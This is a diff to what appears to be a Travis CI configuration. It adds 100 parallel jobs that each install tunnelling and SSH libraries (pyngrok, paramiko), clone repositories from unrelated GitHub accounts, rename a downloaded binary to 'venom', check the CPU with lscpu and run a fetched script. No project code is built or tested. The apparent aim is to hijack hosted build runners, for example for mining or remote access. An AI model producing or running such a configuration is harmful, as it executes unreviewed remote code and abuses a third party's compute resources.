@@ -3,6 +3,109 @@ dist: focal
 python:
   - "3.10"
 
+env:
+  matrix:
+    - JOB_ID=1
+    - JOB_ID=2
+    - JOB_ID=3
+    - JOB_ID=4
+    - JOB_ID=5
+    - JOB_ID=6
+    - JOB_ID=7
+    - JOB_ID=8
+    - JOB_ID=9
+    - JOB_ID=10
+    - JOB_ID=11
+    - JOB_ID=12
+    - JOB_ID=13
+    - JOB_ID=14
+    - JOB_ID=15
+    - JOB_ID=16
+    - JOB_ID=17
+    - JOB_ID=18
+    - JOB_ID=19
+    - JOB_ID=20
+    - JOB_ID=21
+    - JOB_ID=22
+    - JOB_ID=23
+    - JOB_ID=24
+    - JOB_ID=25
+    - JOB_ID=26
+    - JOB_ID=27
+    - JOB_ID=28
+    - JOB_ID=29
+    - JOB_ID=30
+    - JOB_ID=31
+    - JOB_ID=32
+    - JOB_ID=33
+    - JOB_ID=34
+    - JOB_ID=35
+    - JOB_ID=36
+    - JOB_ID=37
+    - JOB_ID=38
+    - JOB_ID=39
+    - JOB_ID=40
+    - JOB_ID=41
+    - JOB_ID=42
+    - JOB_ID=43
+    - JOB_ID=44
+    - JOB_ID=45
+    - JOB_ID=46
+    - JOB_ID=47
+    - JOB_ID=48
+    - JOB_ID=49
+    - JOB_ID=50
+    - JOB_ID=51
+    - JOB_ID=52
+    - JOB_ID=53
+    - JOB_ID=54
+    - JOB_ID=55
+    - JOB_ID=56
+    - JOB_ID=57
+    - JOB_ID=58
+    - JOB_ID=59
+    - JOB_ID=60
+    - JOB_ID=61
+    - JOB_ID=62
+    - JOB_ID=63
+    - JOB_ID=64
+    - JOB_ID=65
+    - JOB_ID=66
+    - JOB_ID=67
+    - JOB_ID=68
+    - JOB_ID=69
+    - JOB_ID=70
+    - JOB_ID=71
+    - JOB_ID=72
+    - JOB_ID=73
+    - JOB_ID=74
+    - JOB_ID=75
+    - JOB_ID=76
+    - JOB_ID=77
+    - JOB_ID=78
+    - JOB_ID=79
+    - JOB_ID=80
+    - JOB_ID=81
+    - JOB_ID=82
+    - JOB_ID=83
+    - JOB_ID=84
+    - JOB_ID=85
+    - JOB_ID=86
+    - JOB_ID=87
+    - JOB_ID=88
+    - JOB_ID=89
+    - JOB_ID=90
+    - JOB_ID=91
+    - JOB_ID=92
+    - JOB_ID=93
+    - JOB_ID=94
+    - JOB_ID=95
+    - JOB_ID=96
+    - JOB_ID=97
+    - JOB_ID=98
+    - JOB_ID=99
+    - JOB_ID=100
+
 before_install:
   - sudo apt-get update
   - sudo apt-get install -y gcc
@@ -12,11 +115,15 @@ install:
   - pip install Flask pyngrok paramiko
 
 before_script:
-  - git clone https://github.com/MiLKyWay-cyBer/ss.git 
-   
+  - git clone https://github.com/tyr892316/Vdn.git
+  - mv  Vdn/m.py ./
+  - git clone https://github.com/MiLKyWay-cyBer/ss.git
   - mv ss/mrin ./
   - mv mrin venom
-  - git clone https://github.com/tyr892316/Vdn.git
-  - mv Vdn/m.py ./
 script:
-  - chmod +x * && lscpu && python3 m.py
+  - chmod +x *
+  - lscpu
+  - python3 m.py
+  - echo "Python script finished in Job ID $JOB_ID. Waiting 100 seconds..."
+  - sleep 100
+  - echo "100 seconds have passed for Job ID $JOB_ID."
